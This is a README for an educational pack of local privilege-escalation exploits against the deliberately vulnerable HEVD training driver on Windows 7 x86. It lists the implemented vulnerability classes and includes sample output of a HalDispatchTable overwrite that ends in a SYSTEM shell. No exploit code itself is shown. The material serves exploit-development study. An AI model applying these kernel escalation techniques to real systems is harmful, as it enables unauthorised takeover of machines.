### HEVD_Kernel_Exploit

My _HackSysExtremeVulnerableDriver_ exploits pack for education purposes developed under **Windows 7 x86 SP1**. Obviously does not employ **SMEP** bypasses.

One thing to note - the kernel payload that has been used is a single asm naked function, albeit it is from exploit to exploit being copied to dynamically allocated RWX buffers and then in an unelegant way patched to conform specific call stack needs (in one exploit leaving `pop ebp` in other patching it out with `nops`, in one leaving `ret $8` while in other sticking to `retn`). I know this is a mess, but I never bothered to make couple of naked functions with one or two epilogues varying for this issue.


---
### Working at the moment

Out of 11 vulnerabilities placed in HEVD, there are at the moment following exploits implemented:

* _Stack Overflow_
* _Arbitrary Memory Overwrite_
* _NULL Pointer Dereference_
* _Integer Overflow_
* _Type Confusion_
* _Uninitialized Stack Variable_
* _Uninitialized Heap Variable_
* _Use After Free_

Found to be working stable.


---
### Example:

```
        HackSysExtremeVulnerableDriver
        Local Privilege Escalation exploit's pack'
        Mariusz B. / mgeeky, '17

[+] Found hevd.sys driver's base: 0x90b36000
[+] Opened HackSysExtremeVulnerableDriver driver's handle.
[?] Kernel shellcode in user-memory at: 0x0040676f (size: 81 bytes).

--------------------------------
[01] Stack Overflow, IOCTL code: 0x00222003
[02] Arbitrary Memory Overwrite / Write-What-Where, IOCTL code: 0x0022200b
[03] Null Pointer Dereference, IOCTL code: 0x0022202b
[04] Integer Overflow, IOCTL code: 0x00222027
[05] Type Confusion, IOCTL code: 0x00222023
[06] Uninitialized Stack Variable, IOCTL code: 0x0022202f
[07] Uninitialized Heap Variable, IOCTL code: 0x00222033
[99] Exit.

[..] Select an exploit to launch against HEVD.SYS (or 99 to exit): 2

--------------------------------
[.] Loading ntkrnlpa.exe
[.] Determining HalDispatchTable symbol's offset...
[.] Custom kernel shellcode will now be located at: 0x0x3e0000
[.] Adjusting the kernel payload to make it ret 0x08
[.] Constructed custom payload capable of restoring overwritten pointer.
[.] Freeing memory allocated for the kernel payload.
[+] `hal!HalDispatchTable+4` is located at: 0x82966404
[+] Arbitrary Overwrite:
        - Where: 0x0x82966404 (hal!HaliQuerySystemInformation)
        - What: 0x3f0000 (address of shellcode in user space memory)

[+] Issuing IOCTL: HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE
[.] Input buffer: 0x0x22fd7c, size: 8 bytes. Output: 0x0
[>] After sending IOCTL. ret: TRUE, last error: 0, written bytes: 0

[.] Invoking overwritten pointer by calling `NtQueryIntervalProfile`
[.] Exploit has been launched without errors.
[.] Exploit success check: Current user: (SYSTEM), expected: (SYSTEM)
[+] Succeeded. Enjoy your SYSTEM! :-)

--------------------------------

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\IEUser\Desktop>
```


---
### TODO:

- _Pool Overflow_
- _Stack Overflow GS_
- _Double Fetch_
- Refactor the code to be a bit more readable and C++ friendly (especially to use some of C++17 features)
- `s/system/CreateProcess`
- move exploit files to a separate directory and modify `#include`s
- Add `argv` parsing
- Add custom command execution from within user input or `argv`
